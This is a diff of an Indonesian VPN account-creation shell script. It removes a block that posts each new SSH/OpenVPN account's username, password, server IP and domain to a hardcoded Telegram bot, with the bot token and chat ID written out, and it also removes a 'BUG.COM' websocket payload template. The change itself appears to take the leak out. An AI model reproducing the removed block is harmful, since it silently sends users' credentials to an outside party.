@@ -167,46 +167,6 @@ OVPN Download : https://$domain:81/
 =================================
 
 END
-
-CHATID="5008116231"
-   KEY="6638955090:AAESojtt1ZPmuTNESoNHfgyPdU92Ue7d4H4"
-  TIME="10"
-   URL="https://api.telegram.org/bot$KEY/sendMessage"
-  TEXT="Installasi VPN Script Stable V3.0
-<code>────────────────────</code>
-<code>SSH OVPN Account     </code>
-<code>────────────────────</code>
-<code>Username         : </code> <code>$Login</code>
-<code>Password         : </code> <code>$Pass</code>
-<code>Limit Quota       ; </code> <code>$Quota</code>
-<code>────────────────────</code>
-<code>IP               : $IP</code>
-<code>Host             : </code> <code>$domain</code>
-<code>Port OpenSSH     : 443, 80, 22</code>
-<code>Port Dropbear    : 443, 109</code>
-<code>Port SSH WS      : 80, 8080, 8081-9999 </code>
-<code>Port SSH UDP     : 1-65535 </code>
-<code>Port SSH SSL WS  : 443</code>
-<code>Port SSL/TLS     : 400-900</code>
-<code>Port OVPN WS SSL : 443</code>
-<code>Port OVPN SSL    : 443</code>
-<code>Port OVPN TCP    : 443, 1194</code>
-<code>Port OVPN UDP    : 2200</code>
-<code>BadVPN UDP       : 7100, 7300, 7300</code>
-<code>────────────────────</code>
-<code>Payload WSS      : </code><code>GET wss://BUG.COM/ HTTP/1.1[crlf]Host: $domain[crlf]Upgrade: websocket[crlf][crlf]</code>
-<code>────────────────────</code>
-OVPN Download : https://$domain:81/
-<code>────────────────────</code>
-<code>Save Link Account: </code>https://$domain:81/ssh-$Login.txt
-<code>────────────────────</code>
-Aktif Selama         : $masaaktif Hari
-Dibuat Pada          : $tnggl
-Berakhir Pada        : $expe
-<code>────────────────────</code>
-"
-
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo ""
 echo -e "\033[1;93◇━━━━━━━━━━━━━━━━━◇\033[0m"
